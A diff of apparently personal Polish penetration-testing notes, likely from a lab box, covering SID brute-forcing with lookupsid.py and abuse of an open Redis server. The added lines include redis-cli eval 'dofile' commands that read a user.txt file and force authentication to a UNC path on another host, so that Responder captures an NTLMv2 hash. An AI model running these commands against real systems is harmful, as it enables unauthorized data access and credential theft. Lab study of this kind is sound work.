@@ -31,9 +31,14 @@ LOOKUPSID.PY:przeprowadza brutalne wymuszanie identyfikatorów SID systemu Windo
 lookupsid.py guest@ip
 
 REDIS:  Port 6379 Otwarty magazyn danych w pamięci
-REDIS-CLI:
-redis-cli -h ip         mozna wyciagnać potrzebne dane podsluchać RESPONDEREM
+REDIS-CLI:    mozna wyciagnać potrzebne dane
+redis-cli -h ip         
 komendy po zalogwaniu:
+config get dir
+info
+config get *
+eval "dofile('C:\\\\Users\\\\enterprise-security\\\\desktop\\\\user.txt')" 0
+eval "dofile('//10.10.35.224/Desktop')" 0        mozna podsluchać RESPONDEREM otrzymamy NTLMv2-SSP Hash 
 https://redis.io/commands/info/
 
 
